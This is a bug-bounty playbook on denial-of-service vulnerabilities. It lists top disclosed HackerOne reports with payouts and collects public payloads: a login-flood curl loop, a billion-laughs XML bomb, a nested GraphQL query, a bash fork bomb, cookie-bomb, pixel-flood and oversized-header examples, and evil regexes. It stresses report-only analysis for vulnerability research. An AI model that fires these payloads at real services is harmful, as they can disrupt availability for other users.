# Real-World Playbook — Denial of Service (report-only class)

**Class:** `dos` · **Coverage-matrix tier:** 3 · **Hunter2:** (analyze only — NEVER run load/DoS) · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed Denial of Service reports peak at **$12,500**. Rewarded across: GitHub, GitLab, HackerOne, Internet Bug Bounty, PayPal, Rootstock Labs, Shopify, Superhuman (formerly Grammarly).

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API** — HackerOne, $12,500 · 180👍 · [3287208](https://hackerone.com/reports/3287208)
- **Ability to DOS any organization's SSO and open up the door to account takeovers** — Superhuman (formerly Grammarly), $10,500 · 259👍 · [976603](https://hackerone.com/reports/976603)
- **Range constructor type confusion DoS** — shopify-scripts, $10,000 · 7👍 · [181910](https://hackerone.com/reports/181910)
- **DoS on PayPal via web cache poisoning** — PayPal, $9,700 · 851👍 · [622122](https://hackerone.com/reports/622122)
- **Null target_class DoS** — shopify-scripts, $8,000 · 14👍 · [183405](https://hackerone.com/reports/183405)
- **Denial of service due to invalid memory access in mrb_ary_concat** — shopify-scripts, $8,000 · 9👍 · [184712](https://hackerone.com/reports/184712)
- **Denial of Service in mruby due to null pointer dereference** — shopify-scripts, $8,000 · 8👍 · [181232](https://hackerone.com/reports/181232)
- **ruby DoS https://www.mruby.science** — shopify-scripts, $8,000 · 5👍 · [180695](https://hackerone.com/reports/180695)
- **DOS via issue preview** — GitLab, $7,640 · 25👍 · [1543718](https://hackerone.com/reports/1543718)
- **Possible DoS Vulnerability with Range Header in Rack** — Internet Bug Bounty, $5,420 · 56👍 · [2520679](https://hackerone.com/reports/2520679)
- **DOS of RSKJ server** — Rootstock Labs, $5,000 · 120👍 · [2105808](https://hackerone.com/reports/2105808)
- **CVE-2024-34750 Apache Tomcat DoS vulnerability in HTTP/2 connector** — Internet Bug Bounty, $4,920 · 60👍 · [2586226](https://hackerone.com/reports/2586226)
- **important: Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request (CVE-2024-38477)** — Internet Bug Bounty, $4,920 · 27👍 · [2585375](https://hackerone.com/reports/2585375)
- **Denial of Service caused by HTTP/2 CONTINUATION Flood** — Internet Bug Bounty, $4,860 · 42👍 · [2334401](https://hackerone.com/reports/2334401)
- **DoS via markdown API from unauthenticated user** — GitHub, $4,000 · 54👍 · [1619604](https://hackerone.com/reports/1619604)
- **DoS through PeerExplorer** — Rootstock Labs, $4,000 · 50👍 · [363636](https://hackerone.com/reports/363636)
- **DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com** — Shopify, $3,800 · 265👍 · [1695604](https://hackerone.com/reports/1695604)
- **http: Reading unprocessed HTTP request with unbounded chunk extension allows DoS attacks** — Internet Bug Bounty, $3,495 · 40👍 · [2375446](https://hackerone.com/reports/2375446)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
    for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done
```
```
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
```
```
    query { 
        repository(owner:"rails", name:"rails") {
            assignableUsers (first: 100) {
                nodes {
                    repositories (first: 100) {
                        nodes {
                            
                        }
                    }
                }
            }
        }
    }
```
```
    :(){ :|:& };:
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From AllAboutBugBounty
### Denial of Service

#### Introduction
Denial of Service is a type of attack on a service that disrupts its normal function and prevents other users from accessing it

#### Where to find
This vulnerability can appear in all features of the application. Depending on how to exploit it, for example in the file upload feature, you can upload very large files

#### How to exploit
1. Cookie bomb
   
```
https://target.com/index.php?param1=xxxxxxxxxxxxxx
```
After input "xxxxxxxxxxxxxx" as a value of param1, check your cookies. If there is cookies the value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable

2. Try input a very long payload to form. For example using very long password or using very long email
```
POST /register HTTP/1.1
Host: target.com
...

username=victim&password=aaaaaaaaaaaaaaa
```

3. Pixel flood, using image with a huge pixels

Download the payload: [Here](https://daffa.tech/lottapixel3.jpg)

4. Frame flood, using GIF with a huge frame

Download the payload: [Here](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/000/136/902000ac102f14a36a4d83ed9b5c293017b77fc7/uber.gif?response-content-disposition=attachment%3B%20filename%3D%22uber.gif%22%3B%20filename%2A%3DUTF-8%27%27uber.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ245MJJPA%2F20200910%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200910T110848Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFMaCXVzLXdlc3QtMiJHMEUCIEC768ifpRHeEUucuNuVL%2FdcSsWMnGeNp%2FMhKs6afB01AiEAiZOP%2FwMaeQMITUni3aFcACIOqOHnWHgLKuXHRrb5LooqtAMIXBABGgwwMTM2MTkyNzQ4NDkiDHHy9PJ2ccl9cmsvyCqRA6bliBHBMPXR6NYflM%2BCXCCQ5VLdPCATpmLs9DhVuYsjxR3JUtVHnBvtfEYYWDWWsLoC3xuzmug5ycrAvqK%2BTYDYO7l4HD1rXfyEBkR579ZlUFab6bOL4i8nDqblun%2FeV253Sgd6GzL4E%2FXmUN%2FC6qNydSd9hp2fLoyNjqob6o5zJjmnqvZsq50ROOZwf1idkDtr163qeVZERnan7aY9rM%2FsX4iVdE4wY0rLw1maGRuDF2aLVCxPB681htsHt%2FpoZ18QY7LjcbNjbjB4PgXLd1sm5zQ4q9mPVxTZPvzo9BJCh7l6kMLHCtJXOXfrvvN8UBgIqr1KXvodzv7FRQYcvEpfw4pwCTWzBs8VeEcwS9gjOXFMNLNI8SZ9V76VQ5KrOIpKhzM9UQQN3DVzY3SwMHydX%2B%2BYcQTt%2FjvqTkorsltqob2g5E1K0U8btRLBvBqOo0Vbr75zLcLUUomDBQzSNSvJgTN43huYmkZxBpWAAId72Tt6m56aFQLXkCKGSoMxYjrrVW9jc37pVl3lZU7FIX0AMIuN6PoFOusBpDCrjFwR1Y7t7W8wLapYjI6yOkkvWTFwWvx38jZl9okqo5xchKolmKxKX7cfGPIyuUmSXc1xa0nKwYeOYlhQZfyI0NobqyWW81ITuuUjsBxULuqrXqfVl0PTjTTpqe%2FHvU6wYSE358XfggtcqaH9PPgNDOejgv%2FLnh9AH9nyqIWuaCu865IfAOupVVzFzQilyB2LDyQtTS4Kp5dHyEAibRQlqeKHWOkUE2mQefAaTxKLRKrs0mJQYSuC%2B4LQEB3Cq9Nhj5HN%2BYT7A7CDLrvyChyfYXQZYr0lR1jN91Yd7SBe2jB1Qls%2Bx%2FEUlQ%3D%3D&X-Amz-Signature=910a3812cf3b69f6fa72f39a89a6df2f395f8d17ef8702eeb164a0477c64fff5)

5. Sometimes in website we found a parameter that can adjust the size of the image, for example
```
https://target.com/img/vulnerable.jpg?width=500&height=500
```
Try change "500" to "99999999999"
```
https://target.com/img/vulnerable.jpg?width=99999999999&height=99999999999
```

6. Try changing the value of the header with something new, for example:
```
Accept-Encoding: gzip, gzip, deflate, br, br
```

7. Sometimes if you try bug "No rate limit", after a long try it. The server will go down because there is so much requests

8. ReDoS (Regex DoS) occurs due to poorly implemented RegEx

9. CPDoS ([Cache Poisoned Denial of Service](https://cpdos.org/))
- HTTP Header Oversize (HHO)
  
  A malicious client sends an HTTP GET request including a header larger than the size supported by the origin server but smaller than the size supported by the cache
  ```
  GET /index.html HTTP/1.1
  Host: victim.com
  X-Oversized-Header-1: Big_Value
  ...

  ```
  The response is
  ```
  HTTP/1.1 400 Bad Request
  ...

  Header size exceeded
  ```
- HTTP Meta Character (HMC)

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Regular Expression Denial of Service - ReDoS


A **Regular Expression Denial of Service (ReDoS)** occurs when attacker-controlled input drives a vulnerable regular-expression engine into excessive computation. Ambiguous nested quantifiers or overlapping alternatives can make a backtracking engine explore exponentially or polynomially many paths, consuming a worker thread or event loop for a long time.<sup>[[1]](#references)[[5]](#references)</sup>

#### The Problematic Regex Naïve Algorithm

**Check the details in [https://owasp.org/www-community/attacks/Regular*expression_Denial_of_Service*-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)**<sup>[[1]](#references)</sup>

##### Engine behavior and exploitability

- Widely used engines such as PCRE, Java `java.util.regex`, Python `re`, and JavaScript `RegExp` use backtracking for relevant pattern features. Crafted inputs that create many overlapping ways to match a subpattern can force exponential or high-polynomial work.<sup>[[5]](#references)</sup>
- Some engines/libraries are designed to be **ReDoS-resilient** by construction (no backtracking), e.g. **RE2** and ports based on finite automata that provide worst‑case linear time; using them for untrusted input removes the backtracking DoS primitive. See the references at the end for details.<sup>[[5]](#references)[[6]](#references)</sup>

#### Evil Regexes <a href="#evil-regexes" id="evil-regexes"></a>

An "evil regex" is a pattern that performs excessive work on a crafted input. Common warning signs include a repeated group containing another repetition or overlapping alternatives.<sup>[[1]](#references)[[5]](#references)</sup>

- (a+)+
- ([a-zA-Z]+)\*
- (a|aa)+
- (a|a?)+

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Algorithmic complexity / ReDoS / amplification — DESCRIBE, do not exploit
- Most programs treat volumetric DoS as out-of-scope; report logic-DoS carefully

## Hunter2 wiring
- **Run:** `(analyze only — NEVER run load/DoS)`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 3 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- Application-level DoS / rate-limit-only without security impact — usually out of scope; Hunter2 never runs load/DoS
- Volumetric / flood / amplification against production — out of scope on nearly every program
- Rate-limit-only on a non-critical form (search, contact, login behind Cloudflare) with no security consequence
- Cookie-bomb / long-input / pixel-flood reported without demonstrating sustained outage impact on other users
- "Server got slow" with no reproducible, bounded, low-cost trigger (fails Q1's step-2 request)
- Single-account self-DoS, or a theoretical ReDoS never confirmed against the live service

**Conditionally valid (only WITH a chain):** a low-cost, unauthenticated, reproducible logic/amplification DoS (GraphQL mutation aliasing, ReDoS, cache-poisoned DoS) impacting all users — DESCRIBE, do not exploit; report carefully → Medium/High where in scope.
